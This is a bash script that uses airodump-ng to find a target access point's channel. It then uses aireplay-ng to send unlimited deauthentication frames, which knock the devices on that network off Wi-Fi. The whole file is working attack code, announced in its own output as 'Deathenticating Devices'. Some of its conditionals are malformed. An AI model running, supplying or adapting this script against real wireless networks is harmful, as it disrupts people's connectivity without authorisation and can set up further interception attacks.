#!/bin/bash 

if [[ -n $1 && $1 == *"mon"* ]]  then 

	airodump-ng --output-format csv -w airodump_output $1  >/dev/null 2>&1 &   

	AIRODUMP_PID=$!
elif [[ $1 == *"mon"* ]]  then 
	printf "[-] $1 interface is not in monitor mode"
	exit 1
else  
	printf "[-] $1 interface not found"
	exit 1
fi 

sleep 1  
echo "[+] airodump-ng started with PID: $AIRODUMP_PID"

sleep 1  

echo "[*] Scanning for 5 seconds..."
sleep 5

BSSID_CHA=$(cat airodump_output-01.csv | head -n  $(grep -n '^[[:space:]]*$' airodump_output-01.csv | cut -d: -f1 | head -n 2 | tail -1) | grep "$3" | cut -d " " -f7 | cut -d  "," -f1)

if [[ $BSSID_CHA ]] ; then
	echo "[*] AP Channel Found..." 

else 
	echo "[-] AP Channel Not Found..." 
	exit 1  

fi 

echo "[*] Start monitoring ..." 
airodump-ng --bssid  $2 $1 >/dev/null 2>&1 &

sleep 5 

BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  $2  $1 -j | cut -d " " -f11 | head -n 1 ) 

sleep 5 

echo "[*] Checking channels " 

while true  ; 
do 
	if [[ $BSSID_CHA != $BSSID_CHA_DEAUTH ]] ; then 
		BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  $2 $1 -j | cut -d " " -f11 | head -n 1 ) 
		echo "[-] Not the Same channel : $BSSID_CHA != $BSSID_CHA_DEAUTH ... Trying other channels " 
		sleep 1 
		break 
	else 
		aireplay-ng -0 0 -a  $2  $1  
		echo "[+] Channel Found \n" 
		sleep 1 
		echo "[+] Deathenticating Devices... " 
	fi 
	continue 
done 

